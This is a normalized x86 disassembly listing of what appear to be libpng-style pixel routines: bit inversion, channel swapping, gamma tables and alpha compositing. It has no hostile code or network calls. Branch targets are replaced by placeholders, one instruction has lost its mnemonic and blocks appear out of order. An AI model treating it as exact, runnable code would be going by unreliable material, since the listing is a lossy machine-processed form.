mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
mov edx [ ebx + 0x178 ]
mov eax [ edx + esi * 4 ]
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
call sub_44120e
add esp 0x4
push ebx
call ecx
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x1e4 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
inc esi
cmp esi edi
jl r-xdata
mov ecx [ ebx + 0x24c ]
push eax
test ecx ecx
je r-xdata
mov ebp [ ebx + 0x48 ]
push 0x28c
mov ecx 0x10
mov esi ebx
lea edi [ esp + 0x10 ]
[ edi ] [ esi ]
mov ecx [ ebx + 0x24c ]
mov esi [ ebx + 0x40 ]
mov edi [ ebx + 0x44 ]
push 0x0
push ebx
mov [ esp + 0x5c ] ecx
call sub_443360
mov edx [ esp + 0x5c ]
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
add esp 0xc
mov ecx 0x10
lea esi [ esp + 0xc ]
mov edi ebx
[ edi ] [ esi ]
pop edi
pop esi
mov [ ebx + 0x48 ] ebp
mov [ ebx + 0x24c ] edx
pop ebp
add esp 0x40
retn
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call ecx
add esp 0x8
jmp r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x28 ]
mov eax [ esi + 0x24 ]
push ecx
push edx
call eax
add esp 0x8
mov [ esi + 0x1c ] 0x0
push eax
mov eax [ esi + 0x28 ]
push eax
call ecx
add esp 0x8
sub_431d90
mov dl [ ecx + 0x8 ]
test dl dl
jne r-xdata
cmp dl 0x4
jne r-xdata
mov ecx [ ecx + 0x4 ]
test ecx ecx
jbe r-xdata
retn
cmp [ ecx + 0x9 ] 0x8
jne r-xdata
mov edi edi
cmp dl 0x4
jne r-xdata
mov ecx [ ecx + 0x4 ]
test ecx ecx
jbe r-xdata
mov dl [ eax ]
not dl
mov [ eax ] dl
inc eax
sub ecx 0x1
jne r-xdata
retn
cmp [ ecx + 0x9 ] 0x10
jne r-xdata
dec ecx
shr ecx 0x1
inc ecx
mov ecx [ ecx + 0x4 ]
test ecx ecx
jbe r-xdata
mov dl [ eax ]
not dl
mov [ eax ] dl
add eax 0x2
sub ecx 0x1
jne r-xdata
retn
dec ecx
shr ecx 0x2
inc eax
inc ecx
lea ebx [ ebx ]
movzx edx [ eax - 0x1 ]
not dl
mov [ eax - 0x1 ] dl
movzx edx [ eax ]
not dl
mov [ eax ] dl
add eax 0x4
sub ecx 0x1
jne r-xdata
sub_431e10
mov dl [ ecx + 0x9 ]
cmp dl 0x8
jae r-xdata
retn
mov ecx [ ecx + 0x4 ]
add ecx eax
push esi
cmp dl 0x1
jne r-xdata
cmp dl 0x2
jne r-xdata
mov esi r--data
jmp r-xdata
cmp dl 0x4
jne r-xdata
mov esi r--data
jmp r-xdata
cmp eax ecx
jae r-xdata
pop esi
mov esi r--data
movzx edx [ eax ]
mov dl [ edx + esi ]
mov [ eax ] dl
inc eax
cmp eax ecx
jb r-xdata
sub_431e60
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0xc ]
mov dl [ ebp + 0x8 ]
push esi
mov esi eax
push edi
mov edi [ ebp ]
mov ecx esi
cmp dl 0x2
je r-xdata
cmp [ ebp + 0xa ] 0x4
jne r-xdata
cmp dl 0x6
jne r-xdata
test dl dl
je r-xdata
cmp [ ebp + 0x9 ] 0x8
jne r-xdata
test ebx __dos_header
je r-xdata
cmp [ ebp + 0xa ] 0x2
jne r-xdata
cmp dl 0x4
jne r-xdata
test bl bl
jns r-xdata
test bl bl
jns r-xdata
test ebx __dos_header
je r-xdata
mov dl 0x8
cmp [ ebp + 0x9 ] dl
jne r-xdata
test ebx __dos_header
je r-xdata
test edi edi
jbe r-xdata
lea edx [ esi + 0x8 ]
lea eax [ esi + 0x6 ]
cmp edi 0x1
jbe r-xdata
test edi edi
jbe r-xdata
lea edx [ esi + 0x3 ]
lea eax [ esi + 0x4 ]
cmp edi 0x1
jbe r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
and [ ebp + 0x8 ] 0xfb
test bl bl
jns r-xdata
test bl bl
jns r-xdata
lea eax [ edi + edi * 2 ]
add eax eax
mov [ ebp + 0xb ] 0x30
mov [ ebp + 0x4 ] eax
mov [ ebp + 0xa ] 0x3
jmp r-xdata
mov esi edi
lea esi [ edi - 0x1 ]
lea eax [ edi + edi * 2 ]
mov [ ebp + 0xb ] 0x18
mov [ ebp + 0x4 ] eax
mov [ ebp + 0xa ] 0x3
jmp r-xdata
mov esi edi
lea ecx [ ecx ]
lea esi [ edi - 0x1 ]
test edi edi
jbe r-xdata
lea edx [ esi + 0x4 ]
lea eax [ esi + 0x2 ]
cmp edi 0x1
jbe r-xdata
test edi edi
jbe r-xdata
test edi edi
jbe r-xdata
movzx edx [ eax + 0x2 ]
mov [ ecx ] dl
add eax 0x2
movzx edx [ eax + 0x1 ]
inc eax
mov [ ecx + 0x1 ] dl
movzx edx [ eax + 0x1 ]
inc ecx
inc eax
mov [ ecx + 0x1 ] dl
movzx edx [ eax + 0x1 ]
inc ecx
inc eax
inc ecx
mov [ ecx ] dl
movzx edx [ eax + 0x1 ]
inc eax
inc ecx
mov [ ecx ] dl
movzx edx [ eax + 0x1 ]
inc eax
inc ecx
mov [ ecx ] dl
inc ecx
inc eax
sub esi 0x1
jne r-xdata
movzx ecx [ edx ]
mov [ eax ] cl
movzx ecx [ edx + 0x1 ]
inc edx
mov [ eax + 0x1 ] cl
movzx ecx [ edx + 0x1 ]
inc eax
inc edx
mov [ eax + 0x1 ] cl
movzx ecx [ edx + 0x1 ]
inc eax
inc edx
inc eax
mov [ eax ] cl
movzx ecx [ edx + 0x1 ]
inc edx
inc eax
mov [ eax ] cl
movzx ecx [ edx + 0x1 ]
inc edx
inc eax
mov [ eax ] cl
inc eax
add edx 0x3
sub esi 0x1
jne r-xdata
jmp r-xdata
movzx edx [ eax + 0x1 ]
inc eax
mov [ ecx ] dl
movzx edx [ eax + 0x1 ]
inc eax
inc ecx
mov [ ecx ] dl
movzx edx [ eax + 0x1 ]
inc eax
inc ecx
mov [ ecx ] dl
inc ecx
inc eax
sub esi 0x1
jne r-xdata
movzx ecx [ eax ]
mov [ edx ] cl
movzx ecx [ eax + 0x1 ]
inc eax
inc edx
mov [ edx ] cl
movzx ecx [ eax + 0x1 ]
inc eax
inc edx
mov [ edx ] cl
inc edx
add eax 0x2
sub esi 0x1
jne r-xdata
lea eax [ edi + edi * 2 ]
mov [ ebp + 0xb ] 0x18
mov [ ebp + 0x4 ] eax
mov [ ebp + 0xa ] 0x3
jmp r-xdata
lea eax [ edi + edi ]
mov [ ebp + 0xb ] 0x10
mov [ ebp + 0x4 ] eax
mov esi edi
mov edi edi
lea esi [ edi - 0x1 ]
jmp r-xdata
mov [ ebp + 0xb ] dl
mov [ ebp + 0x4 ] edi
jmp r-xdata
mov esi edi
nop
mov esi edi
lea ebx [ ebx ]
movzx edx [ eax + 0x2 ]
add eax 0x2
mov [ ecx ] dl
movzx edx [ eax + 0x1 ]
inc eax
inc ecx
mov [ ecx ] dl
inc ecx
inc eax
sub esi 0x1
jne r-xdata
movzx ecx [ edx ]
mov [ eax ] cl
movzx ecx [ edx + 0x1 ]
inc edx
inc eax
mov [ eax ] cl
inc eax
add edx 0x3
sub esi 0x1
jne r-xdata
mov [ ebp + 0xa ] 0x1
mov bl [ eax + 0x1 ]
inc eax
mov [ ecx ] bl
inc ecx
inc eax
sub esi 0x1
jne r-xdata
mov ebx [ esp + 0x18 ]
mov bl [ eax ]
mov [ ecx ] bl
inc ecx
add eax 0x2
sub esi 0x1
jne r-xdata
mov ebx [ esp + 0x18 ]
mov [ ebp + 0xb ] dl
mov [ ebp + 0x4 ] edi
jmp r-xdata
jmp r-xdata
sub_4320b0
push ebx
mov bl [ edx + 0x8 ]
test bl 0x2
je r-xdata
pop ebx
retn
mov ecx [ edx ]
mov dl [ edx + 0x9 ]
push esi
cmp dl 0x8
jne r-xdata
cmp dl 0x10
jne r-xdata
cmp bl 0x2
jne r-xdata
pop esi
cmp bl 0x2
jne r-xdata
cmp bl 0x6
jne r-xdata
test ecx ecx
jbe r-xdata
cmp bl 0x6
jne r-xdata
test ecx ecx
jbe r-xdata
test ecx ecx
jbe r-xdata
mov esi ecx
test ecx ecx
jbe r-xdata
inc eax
mov esi ecx
lea ecx [ ecx ]
mov esi ecx
mov dl [ eax ]
mov cl [ eax + 0x2 ]
mov [ eax ] cl
mov [ eax + 0x2 ] dl
add eax 0x3
sub esi 0x1
jne r-xdata
pop esi
pop ebx
retn
inc eax
mov esi ecx
nop
movzx edx [ eax + 0x3 ]
mov cl [ eax - 0x1 ]
mov [ eax - 0x1 ] dl
movzx edx [ eax + 0x4 ]
mov [ eax + 0x3 ] cl
mov cl [ eax ]
mov [ eax ] dl
mov [ eax + 0x4 ] cl
add eax 0x6
sub esi 0x1
jne r-xdata
pop esi
pop ebx
retn
mov dl [ eax ]
mov cl [ eax + 0x2 ]
mov [ eax ] cl
mov [ eax + 0x2 ] dl
add eax 0x4
sub esi 0x1
jne r-xdata
pop esi
pop ebx
retn
movzx edx [ eax + 0x3 ]
mov cl [ eax - 0x1 ]
mov [ eax - 0x1 ] dl
movzx edx [ eax + 0x4 ]
mov [ eax + 0x3 ] cl
mov cl [ eax ]
mov [ eax ] dl
mov [ eax + 0x4 ] cl
add eax 0x8
sub esi 0x1
jne r-xdata
sub_432180
sub esp 0x4c
push ebx
push ebp
push esi
mov esi eax
mov ecx [ esi + 0x70 ]
movzx edx [ esi + 0x126 ]
mov eax ecx
and eax 0x100
push edi
mov [ esp + 0x24 ] edx
je r-xdata
test cl cl
jns r-xdata
test dl 0x2
je r-xdata
test eax eax
je r-xdata
test eax eax
jne r-xdata
or [ esi + 0x68 ] 0x800
mov edx [ esp + 0x24 ]
test ecx 0x1000
je r-xdata
test ecx 0x4000
je r-xdata
mov ecx [ esi + 0x70 ]
test ecx 0x602000
je r-xdata
movzx edx [ esi + 0x11a ]
test dx dx
je r-xdata
mov edx [ esp + 0x24 ]
test dl 0x2
jne r-xdata
movzx edx [ esi + 0x13a ]
cmp dx [ esi + 0x13c ]
jne r-xdata
test cl cl
jns r-xdata
fldz
fcomp [ esi + 0x15c ]
fnstsw ax
test ah 0x44
jpo r-xdata
fld [ esi + 0x160 ]
fmul [ esi + 0x15c ]
fsub [ r--data ]
fabs
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x3
jne r-xdata
movzx eax [ esi + 0x127 ]
dec eax
cmp eax 0xf
ja r-xdata
cmp dx [ esi + 0x13e ]
jne r-xdata
test [ esi + 0x70 ] 0x8
je r-xdata
cmp [ esp + 0x24 ] 0x3
jne r-xdata
call sub_436200
test [ esi + 0x70 ] 0x80
je r-xdata
xor eax eax
xor ebp ebp
xor ecx ecx
cmp ax dx
jae r-xdata
mov eax [ esi + 0x138 ]
mov ecx [ esi + 0x13c ]
mov [ esi + 0x142 ] eax
mov ax [ esi + 0x140 ]
mov [ esi + 0x146 ] ecx
mov [ esi + 0x14a ] ax
mov ebx 0xffffdfff
cmp edx 0x3
jne r-xdata
movzx eax [ esi + 0x138 ]
mov edi [ esi + 0x114 ]
lea eax [ eax + eax * 2 ]
add eax edi
movzx edi [ eax ]
mov [ esi + 0x13a ] di
movzx edi [ eax + 0x1 ]
mov [ esi + 0x13c ] di
movzx ax [ eax + 0x2 ]
mov [ esi + 0x13e ] ax
test ecx 0x80000
je r-xdata
movzx eax [ eax + lookup_table_432ec8 ]
jmp [ eax * 4 + jump_table_432eb4 ]
mov [ esi + 0x140 ] dx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4c
retn
cmp [ esp + 0x24 ] 0x3
jne r-xdata
movzx ebp [ esi + 0x11a ]
movzx edx [ esi + 0x13c ]
mov cl [ esi + 0x13a ]
mov eax [ esi + 0x114 ]
xor edi edi
mov [ esp + 0x19 ] dl
mov dl [ esi + 0x13e ]
mov [ esp + 0x34 ] ebp
mov [ esp + 0x18 ] cl
test ebp ebp
jle r-xdata
cmp [ esp + 0x24 ] 0x3
jne r-xdata
cmp [ esp + 0x24 ] 0x3
jne r-xdata
and [ esi + 0x70 ] ebx
movzx edi [ esi + 0x11a ]
mov edx [ esi + 0x188 ]
nop
test ecx 0x2000000
jne r-xdata
mov ax [ esi + 0x140 ]
mov edi 0xff
imul ax di
mov [ esi + 0x140 ] ax
mov [ esi + 0x13e ] ax
mov [ esi + 0x13c ] ax
mov [ esi + 0x13a ] ax
test ecx 0x2000000
jne r-xdata
mov ax [ esi + 0x140 ]
imul ax ax 0x55
mov [ esi + 0x140 ] ax
mov [ esi + 0x13e ] ax
mov [ esi + 0x13c ] ax
mov [ esi + 0x13a ] ax
test ecx 0x2000000
jne r-xdata
mov ax [ esi + 0x140 ]
imul ax ax 0x11
mov [ esi + 0x140 ] ax
mov [ esi + 0x13e ] ax
mov [ esi + 0x13c ] ax
mov [ esi + 0x13a ] ax
test ecx 0x2000000
jne r-xdata
movzx eax [ esi + 0x140 ]
mov [ esi + 0x13e ] ax
mov [ esi + 0x13c ] ax
mov [ esi + 0x13a ] ax
jmp r-xdata
movzx eax [ esi + 0x17c ]
movzx ecx [ esi + 0x17d ]
movzx edi [ esi + 0x17e ]
movzx edx [ esi + 0x118 ]
mov ebx 0x8
sub ebx eax
mov eax 0x8
sub eax ecx
mov ecx 0x8
sub ecx edi
xor edi edi
cmp ebx edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] ecx
jl r-xdata
mov edx [ esi + 0x70 ]
and edx 0xffffff7f
or edx 0x40000
mov [ esi + 0x70 ] edx
add eax 0x2
lea ecx [ ecx ]
movzx ecx [ esi + 0x118 ]
mov eax [ esi + 0x114 ]
test ecx ecx
jle r-xdata
mov cl [ esi + 0x127 ]
mov edx 0x1
shl edx cl
dec edx
mov [ esp + 0x34 ] edx
fild [ esp + 0x34 ]
test edx edx
jge r-xdata
movzx ebp [ esi + 0x118 ]
mov al [ esi + 0x130 ]
mov [ esp + 0x34 ] ebp
cmp al 0x2
jne r-xdata
inc ecx
cmp ecx edi
jl r-xdata
cmp al 0xff
je r-xdata
movzx edi [ esi + 0x11a ]
xor eax eax
test edi edi
jle r-xdata
mov ax [ esi + 0x194 ]
mov ecx edi
imul ax cx
mov ax [ esi + 0x194 ]
imul ax ax 0x55
jmp r-xdata
mov ax [ esi + 0x194 ]
imul ax ax 0x11
jmp r-xdata
xor ebx ebx
cmp ebx 0x8
jle r-xdata
cmp bl 0xff
je r-xdata
mov cx [ esp + 0x18 ]
mov [ eax - 0x2 ] cx
mov [ eax ] dl
jmp r-xdata
and [ esi + 0x70 ] ebx
jmp r-xdata
add eax 0x2
jmp r-xdata
movzx eax [ esi + 0x130 ]
fst [ esp + 0x28 ]
sub eax 0x1
fld1
fld st0
fst [ esp + 0x38 ]
fxch st1
fst [ esp + 0x18 ]
je r-xdata
fadd [ r--data ]
movzx eax al
sub eax 0x1
je r-xdata
movzx ecx [ esi + 0x13a ]
mov eax [ esi + 0x164 ]
movzx edx [ eax + ecx ]
movzx edi [ esi + 0x13c ]
mov [ esp + 0x14 ] dl
movzx edx [ edi + eax ]
mov [ esp + 0x15 ] dl
movzx edx [ esi + 0x13e ]
mov al [ edx + eax ]
mov [ esp + 0x16 ] al
mov eax [ esi + 0x16c ]
movzx edx [ eax + edx ]
mov bl [ eax + ecx ]
mov cl [ eax + edi ]
mov [ esp + 0x19 ] cl
mov [ esp + 0x1a ] dl
jmp r-xdata
mov al [ edx + ecx ]
test al al
je r-xdata
test ebp ebp
jne r-xdata
mov ebp 0x1
jmp r-xdata
mov [ esi + 0x194 ] ax
mov [ esi + 0x192 ] ax
mov [ esi + 0x190 ] ax
mov [ esi + 0x18e ] ax
jmp r-xdata
mov [ esp + 0x24 ] edi
cmp eax 0x8
jle r-xdata
cmp eax edi
jl r-xdata
inc edi
add eax 0x3
cmp edi ebp
jl r-xdata
movzx cx [ ecx ]
movzx bp [ esp + 0x18 ]
mov ebx 0xff
sub ebx ecx
imul bx bp
movzx bp [ eax - 0x2 ]
imul bp cx
add bx bp
movzx bp [ esp + 0x19 ]
mov ecx 0x80
add bx cx
movzx ecx bx
mov ebx ecx
shr ebx 0x8
add ebx ecx
sar ebx 0x8
mov [ eax - 0x2 ] bl
mov ecx [ esi + 0x188 ]
movzx cx [ edi + ecx ]
mov ebx 0xff
sub ebx ecx
imul bx bp
movzx bp [ eax - 0x1 ]
imul bp cx
add bx bp
mov ecx 0x80
add bx cx
movzx ecx bx
mov ebx ecx
shr ebx 0x8
add ebx ecx
sar ebx 0x8
mov [ eax - 0x1 ] bl
mov ecx [ esi + 0x188 ]
movzx cx [ edi + ecx ]
movzx bp dl
mov ebx 0xff
sub ebx ecx
imul bx bp
movzx bp [ eax ]
imul bp cx
add bx bp
mov ebp [ esp + 0x34 ]
mov ecx 0x80
add bx cx
movzx ecx bx
mov ebx ecx
shr ebx 0x8
add ebx ecx
sar ebx 0x8
mov [ eax ] bl
movzx edx [ eax - 0x2 ]
mov edi [ esi + 0x164 ]
movzx edx [ edx + edi ]
mov [ eax - 0x2 ] dl
movzx edx [ eax - 0x1 ]
mov edi [ esi + 0x164 ]
movzx edx [ edx + edi ]
mov [ eax - 0x1 ] dl
movzx edx [ eax ]
mov edi [ esi + 0x164 ]
movzx edx [ edx + edi ]
mov [ eax ] dl
add eax 0x3
sub ecx 0x1
jne r-xdata
fstp st1
fld [ esi + 0x160 ]
fst [ esp + 0x38 ]
fxch st1
fstp [ esp + 0x18 ]
jmp r-xdata
sub eax 0x1
je r-xdata
fld [ esi + 0x160 ]
fstp [ esp + 0x28 ]
fld1
sub eax 0x1
je r-xdata
xor edi edi
test ebp ebp
jle r-xdata
mov ecx [ esi + 0x188 ]
add ecx eax
or bl 0xff
sub bl [ ecx ]
inc eax
cmp eax edi
mov [ ecx ] bl
jl r-xdata
mov [ esp + 0x18 ] edi
cmp ecx 0x8
jle r-xdata
cmp ecx edi
jl r-xdata
mov ecx [ esi + 0x188 ]
mov bl [ ecx + edi ]
add ecx edi
test bl bl
jne r-xdata
movzx eax [ esi + 0x140 ]
mov [ esp + 0x34 ] eax
fild [ esp + 0x34 ]
fdivrp st2
fxch st1
fst [ esp + 0x40 ]
fxch st1
call sub_456890
fmul [ esp + 0x28 ]
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x34 ] eax
fldcw [ esp + 0x34 ]
fistp [ esp + 0x34 ]
mov cx [ esp + 0x34 ]
mov [ esi + 0x14a ] cx
fldcw [ esp + 0x10 ]
fld [ esp + 0x40 ]
fld [ esp + 0x18 ]
call sub_456890
fld [ esp + 0x28 ]
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fmul st1
or eax 0xc00
fxch st1
mov [ esp + 0x34 ] eax
fadd [ r--data ]
fldcw [ esp + 0x34 ]
fistp [ esp + 0x34 ]
mov ax [ esp + 0x34 ]
movzx edi [ esi + 0x13c ]
movzx ecx [ esi + 0x13a ]
fldcw [ esp + 0x10 ]
mov [ esi + 0x140 ] ax
cmp cx di
jne r-xdata
fstp st1
fld [ esi + 0x15c ]
fdivr st1
fst [ esp + 0x38 ]
fld [ esi + 0x160 ]
fmul [ esi + 0x15c ]
fdivp st2
fxch st1
fstp [ esp + 0x18 ]
jmp r-xdata
sub eax 0x1
jne r-xdata
movzx eax [ esi + 0x13a ]
mov [ esp + 0x18 ] eax
fild [ esp + 0x18 ]
fdivrp st1
fxch st1
call sub_456890
fld [ r--data ]
movzx edx [ esi + 0x13c ]
fmul st1
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fxch st1
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x18 ] eax
fldcw [ esp + 0x18 ]
fistp [ esp + 0x18 ]
mov cl [ esp + 0x18 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] cl
fldcw [ esp + 0x10 ]
fild [ esp + 0x18 ]
fdivrp st1
fld [ esp + 0x38 ]
call sub_456890
fld [ r--data ]
movzx ecx [ esi + 0x13e ]
fmul st1
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fxch st1
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x18 ] eax
fldcw [ esp + 0x18 ]
fistp [ esp + 0x18 ]
mov al [ esp + 0x18 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x15 ] al
fldcw [ esp + 0x10 ]
fild [ esp + 0x18 ]
fdivrp st1
fld [ esp + 0x38 ]
call sub_456890
fld [ r--data ]
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fmul st1
fxch st1
or eax 0xc00
mov [ esp + 0x18 ] eax
fadd [ r--data ]
fldcw [ esp + 0x18 ]
fistp [ esp + 0x18 ]
mov dl [ esp + 0x18 ]
fldcw [ esp + 0x10 ]
mov al [ esi + 0x13a ]
fstp st1
mov cl [ esi + 0x13c ]
mov dl [ esi + 0x13e ]
mov [ esp + 0x14 ] al
mov [ esp + 0x15 ] cl
jmp r-xdata
fld [ esi + 0x15c ]
fld1
fld st0
fdivrp st2
fxch st1
fstp [ esp + 0x28 ]
fld [ esi + 0x160 ]
fmul [ esi + 0x15c ]
fdivr st1
jmp r-xdata
sub eax 0x1
je r-xdata
mov eax [ esi + 0x70 ]
and eax 0xffffdf7f
or eax 0x40000
mov [ esi + 0x70 ] eax
jmp r-xdata
mov eax [ esi + 0x114 ]
add eax 0x2
jmp r-xdata
movzx edi dx
mov edi edi
xor eax eax
cmp ax dx
jae r-xdata
movzx edx cx
mov [ esp + 0x34 ] edx
fild [ esp + 0x34 ]
fdivrp st1
fst [ esp + 0x40 ]
fld [ esp + 0x38 ]
call sub_456890
fld [ esp + 0x28 ]
fmul st1
movzx ecx di
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fxch st1
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x34 ] eax
fldcw [ esp + 0x34 ]
fistp [ esp + 0x34 ]
movzx eax [ esp + 0x34 ]
mov [ esp + 0x34 ] ecx
mov [ esi + 0x144 ] ax
fldcw [ esp + 0x10 ]
fild [ esp + 0x34 ]
fdivrp st1
fst [ esp + 0x48 ]
fld [ esp + 0x38 ]
call sub_456890
fld [ esp + 0x28 ]
fmul st1
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fxch st1
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x34 ] eax
movzx eax [ esi + 0x13e ]
fldcw [ esp + 0x34 ]
fistp [ esp + 0x34 ]
movzx edx [ esp + 0x34 ]
mov [ esp + 0x34 ] eax
mov [ esi + 0x146 ] dx
fldcw [ esp + 0x10 ]
fild [ esp + 0x34 ]
fdivrp st1
fst [ esp + 0x50 ]
fld [ esp + 0x38 ]
call sub_456890
fmul [ esp + 0x28 ]
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x34 ] eax
fldcw [ esp + 0x34 ]
fistp [ esp + 0x34 ]
movzx ecx [ esp + 0x34 ]
mov [ esi + 0x148 ] cx
fldcw [ esp + 0x10 ]
fld [ esp + 0x40 ]
fld [ esp + 0x18 ]
call sub_456890
fmul [ esp + 0x28 ]
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x34 ] eax
fldcw [ esp + 0x34 ]
fistp [ esp + 0x34 ]
movzx edx [ esp + 0x34 ]
mov [ esi + 0x13a ] dx
fldcw [ esp + 0x10 ]
fld [ esp + 0x48 ]
fld [ esp + 0x18 ]
call sub_456890
fmul [ esp + 0x28 ]
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x34 ] eax
fldcw [ esp + 0x34 ]
fistp [ esp + 0x34 ]
movzx eax [ esp + 0x34 ]
mov [ esi + 0x13c ] ax
fldcw [ esp + 0x10 ]
fld [ esp + 0x50 ]
fld [ esp + 0x18 ]
call sub_456890
fmul [ esp + 0x28 ]
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x34 ] eax
fldcw [ esp + 0x34 ]
fistp [ esp + 0x34 ]
movzx ecx [ esp + 0x34 ]
mov [ esi + 0x13e ] cx
fldcw [ esp + 0x10 ]
jmp r-xdata
cmp cx [ esi + 0x13e ]
jne r-xdata
fstp st0
fstp st1
fld [ esi + 0x134 ]
fdivr st1
fst [ esp + 0x38 ]
fld [ esi + 0x160 ]
fmul [ esi + 0x134 ]
fdivp st2
fxch st1
fstp [ esp + 0x18 ]
jmp r-xdata
movzx eax [ esi + 0x13a ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x16 ] dl
fild [ esp + 0x18 ]
fdivrp st1
fld [ esp + 0x28 ]
call sub_456890
fld [ r--data ]
movzx ecx [ esi + 0x13c ]
fmul st1
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fxch st1
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x18 ] eax
fldcw [ esp + 0x18 ]
fistp [ esp + 0x18 ]
mov bl [ esp + 0x18 ]
mov [ esp + 0x18 ] ecx
fldcw [ esp + 0x10 ]
fild [ esp + 0x18 ]
fdivrp st1
fld [ esp + 0x28 ]
call sub_456890
fld [ r--data ]
fmul st1
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fxch st1
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x18 ] eax
movzx eax [ esi + 0x13e ]
fldcw [ esp + 0x18 ]
fistp [ esp + 0x18 ]
mov dl [ esp + 0x18 ]
mov [ esp + 0x19 ] dl
fldcw [ esp + 0x10 ]
mov [ esp + 0x10 ] eax
fild [ esp + 0x10 ]
fdivrp st1
fld [ esp + 0x28 ]
call sub_456890
fmul [ r--data ]
fnstcw [ esp + 0x10 ]
movzx eax [ esp + 0x10 ]
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
fistp [ esp + 0x28 ]
mov cl [ esp + 0x28 ]
mov [ esp + 0x1a ] cl
fldcw [ esp + 0x10 ]
fst [ esp + 0x38 ]
fld st0
fsubrp st2
fxch st1
fabs
fcomp [ r--data ]
fnstsw ax
fld [ r--data ]
test ah 0x5
jpe r-xdata
fld [ esi + 0x134 ]
fld1
fld st0
fdivrp st2
fxch st1
fstp [ esp + 0x28 ]
fld [ esi + 0x160 ]
fmul [ esi + 0x134 ]
fdivr st1
jmp r-xdata
fld1
fst [ esp + 0x28 ]
jmp r-xdata
mov ecx [ esi + 0x164 ]
movzx edx [ eax - 0x2 ]
movzx edx [ edx + ecx ]
movzx ecx [ eax - 0x1 ]
mov [ eax - 0x2 ] dl
mov edx [ esi + 0x164 ]
mov cl [ ecx + edx ]
movzx edx [ eax ]
mov [ eax - 0x1 ] cl
mov ecx [ esi + 0x164 ]
movzx edx [ edx + ecx ]
mov [ eax ] dl
mov ecx [ esi + 0x188 ]
mov dl [ ecx + edi ]
add ecx edi
cmp dl 0xff
je r-xdata
mov ecx [ esi + 0x114 ]
lea edx [ eax + ecx ]
mov cl bl
shr [ edx ] cl
mov edx [ esi + 0x114 ]
movzx ecx [ esp + 0x24 ]
shr [ eax + edx + 0x1 ] cl
mov ecx [ esi + 0x114 ]
lea edx [ eax + edx + 0x1 ]
lea edx [ eax + ecx + 0x2 ]
movzx ecx [ esp + 0x18 ]
shr [ edx ] cl
add eax 0x3
sub edi 0x1
jne r-xdata
cmp cx ax
jne r-xdata
fld st0
movzx edx [ esi + 0x11a ]
cmp edi edx
jge r-xdata
test dl dl
jne r-xdata
movzx ecx [ esi + 0x14a ]
fstp st0
mov [ esi + 0x148 ] cx
mov [ esi + 0x146 ] cx
mov [ esi + 0x144 ] cx
mov [ esi + 0x13e ] ax
mov [ esi + 0x13c ] ax
mov [ esi + 0x13a ] ax
jmp r-xdata
movzx cx [ ecx ]
mov ebp [ esi + 0x16c ]
movzx edx [ eax - 0x2 ]
movzx edx [ edx + ebp ]
imul dx cx
mov ebp 0xff
sub ebp ecx
movzx cx bl
imul bp cx
add dx bp
mov ecx 0x80
add dx cx
movzx ecx dx
mov edx ecx
shr edx 0x8
add edx ecx
sar edx 0x8
movzx ecx dl
mov edx [ esi + 0x168 ]
movzx ecx [ ecx + edx ]
mov [ eax - 0x2 ] cl
mov edx [ esi + 0x188 ]
movzx cx [ edx + edi ]
movzx edx [ eax - 0x1 ]
mov ebp [ esi + 0x16c ]
movzx edx [ edx + ebp ]
imul dx cx
mov ebp 0xff
sub ebp ecx
movzx ecx [ esp + 0x19 ]
imul bp cx
add dx bp
mov ecx 0x80
add dx cx
movzx ecx dx
mov edx ecx
shr edx 0x8
add edx ecx
sar edx 0x8
movzx ecx dl
mov edx [ esi + 0x168 ]
movzx ecx [ ecx + edx ]
mov [ eax - 0x1 ] cl
mov edx [ esi + 0x188 ]
